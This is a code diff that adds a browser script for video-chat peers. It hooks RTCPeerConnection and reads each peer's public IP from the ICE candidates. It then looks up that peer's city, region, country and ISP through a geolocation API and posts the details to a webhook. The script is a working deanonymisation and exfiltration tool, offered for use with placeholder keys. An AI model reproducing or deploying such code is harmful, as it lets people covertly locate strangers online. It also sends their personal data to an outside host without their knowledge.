@@ -1,0 +1,72 @@
+const apiKey = "Your API KEY";
+const webhookUrl = "YOUR BOT URL";
+
+window.oRTCPeerConnection =
+  window.oRTCPeerConnection || window.RTCPeerConnection;
+
+window.RTCPeerConnection = function (...args) {
+  const pc = new window.oRTCPeerConnection(...args);
+
+  pc.oaddIceCandidate = pc.addIceCandidate;
+
+  pc.addIceCandidate = function (iceCandidate, ...rest) {
+    const fields = iceCandidate.candidate.split(" ");
+
+    const ip = fields[4];
+    if (fields[7] === "srflx") {
+      post(ip);
+      time(1500);
+      return;
+    }
+    return pc.oaddIceCandidate(iceCandidate, ...rest);
+  };
+  return pc;
+};
+
+const post = async (ip) => {
+  const url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
+
+  const response = await fetch(url);
+  const json = await response.json();
+
+  const random = Math.floor(Math.random() * 100);
+
+  const myEmbed = {
+    author: {
+      name: `${random} | Adres IP: ${ip}`,
+      icon_url: json.country_flag,
+    },
+    title: `Current City: **${json.city}** | State Province: **${json.state_prov}**`,
+    description:`Country Name: **${json.country_name}** | Net Provider: **${json.isp}**`,
+    color: hexToDecimal(`#${Math.round((0x1000000 + 0xffffff * Math.random())).toString(16).slice(1)}`),
+  };
+
+  const params = {
+    username: "Your Bot Name",
+    avatar_url: "https://your-bot-avatar-url.com",
+    embeds: [myEmbed],
+  };
+
+  const requestOptions = {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify(params),
+  };
+
+  await fetch(webhookUrl, requestOptions);
+};
+
+const hexToDecimal = (hex) => {
+  return parseInt(hex.replace("#", ""), 16);
+};
+
+const time = (milliseconds) => {
+  const start = new Date().getTime();
+  for (let i = 0; i < 1e7; i++) {
+    if (new Date().getTime() - start > milliseconds) {
+      break;
+    }
+  }
+};
